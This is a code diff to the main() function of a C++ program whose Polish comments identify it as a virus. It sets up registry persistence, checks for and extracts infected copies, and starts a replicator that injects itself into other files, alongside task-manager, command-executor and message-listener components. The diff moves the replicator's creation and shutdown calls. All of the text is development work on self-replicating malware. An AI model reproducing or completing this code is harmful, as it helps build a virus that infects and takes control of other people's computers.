@@ -14,6 +14,8 @@ using namespace std;
 
 int main()
 {
+    Replicator *replicator = new Replicator();
+
     // Obsluga rejestru - OK!
     RegEditer *regEditer = new RegEditer();
     try
@@ -35,7 +37,12 @@ int main()
             // nalezy przekopiowac wirusa do jego sciazki domyslnej
             // odpalic nowa instancje
             // a ta zakonczyc
+            if(replicator->CheckInfected(regEditer->GetMyName()) == true)
+                replicator->Extract();
+
             regEditer->Register();
+
+            delete replicator;
             delete regEditer;
 
             return 0;
@@ -55,7 +62,6 @@ int main()
     // jestesmy glowna kopia wirusa w systemie dlatego
     // rozpoczynamy replikacje wstrzykujac sie do innych plików
 
-    Replicator *replicator = new Replicator();
     replicator->Start();
 
     TaskMgr *taskMgr = new TaskMgr();
@@ -73,15 +79,15 @@ int main()
 
 
     cout << "OK!" << endl;
-
-    //replicator->Stop();
-    msgMgr->StopListen();
-
     system("pause");
+
+    replicator->Stop();
+    msgMgr->StopListen();
 
     delete msgMgr;
     delete cmdExecutor;
     delete taskMgr;
     delete replicator;
+
     return 0;
 }
